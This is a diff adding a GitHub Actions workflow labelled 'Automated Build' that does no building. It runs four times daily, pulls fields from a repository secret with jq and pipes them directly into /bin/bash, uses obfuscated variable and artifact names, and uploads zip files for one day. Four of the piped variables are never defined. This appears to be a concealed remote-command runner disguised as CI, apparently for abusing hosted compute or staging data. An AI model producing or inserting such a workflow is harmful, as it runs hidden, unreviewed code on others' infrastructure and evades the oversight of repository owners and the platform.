@@ -1,0 +1,37 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '0 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          nrq744: ${{ secrets.nrq744 }}
+        run: |
+          printf '%s' "$nrq744" | jq -r .t41 | /bin/bash
+          echo $lvl490 | jq -r .wmihu64 | /bin/bash
+          echo $l040 | jq -r .wpvuc678 | /bin/bash
+          printf '%s' "$wx35020" | jq -r .jwuc84918 | /bin/bash
+          printf '%s' "$hd204" | jq -r .vvsn69986 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: O84k6Tel
+          path: "*.zip"
+          retention-days: 1
